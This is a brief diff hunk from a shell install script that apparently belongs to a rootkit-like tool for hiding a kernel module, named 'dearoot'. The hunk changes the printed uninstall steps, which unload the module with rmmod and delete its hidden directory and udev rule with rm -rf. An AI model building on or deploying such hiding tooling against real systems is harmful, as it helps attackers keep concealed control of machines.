@@ -68,7 +68,7 @@ echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00
 # How to Uninstall
 echo -e "UNINSTALL:\n"
 echo -e "/$HIDE/$HIDE""_cmd show"
-echo -e "rmmod $HIDE""_module"
+echo -e "rmmod dearoot_module"
 echo -e "rm -rf /$HIDE $RULE $UDEV_DIR/$HIDE"
 echo
 
